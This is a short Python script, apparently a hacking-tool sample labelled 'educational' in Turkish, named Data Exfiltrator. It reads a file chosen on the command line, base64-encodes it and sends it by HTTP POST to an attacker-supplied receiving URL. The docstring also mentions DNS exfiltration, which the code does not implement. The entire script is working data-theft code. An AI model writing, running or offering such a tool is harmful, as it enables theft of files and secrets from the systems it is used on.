#!/usr/bin/env python3
"""
Data Exfiltrator (Eğitim Amaçlı)
================================
Dosyaları base64 ile şifreleyerek DNS veya HTTP üzerinden sızdırma simülasyonu.
"""
import base64
import requests
import sys
import os

def exfiltrate_http(filepath, url):
    if not os.path.exists(filepath):
        print("[-] Dosya bulunamadı.")
        return
        
    print(f"[*] Dosya okunuyor: {filepath}")
    with open(filepath, "rb") as f:
        file_data = f.read()
        
    encoded_data = base64.b64encode(file_data).decode('utf-8')
    
    print(f"[*] Veri gönderiliyor: {url}")
    try:
        # POST verisi olarak gönder
        requests.post(url, data={"data": encoded_data})
        print("[+] Veri başarıyla sızdırıldı (HTTP POST).")
    except Exception as e:
        print(f"[-] Gönderim hatası: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Kullanım: python Data_Exfiltrator.py <DOSYA_YOLU> <ALICI_URL>")
        sys.exit(1)
    exfiltrate_http(sys.argv[1], sys.argv[2])
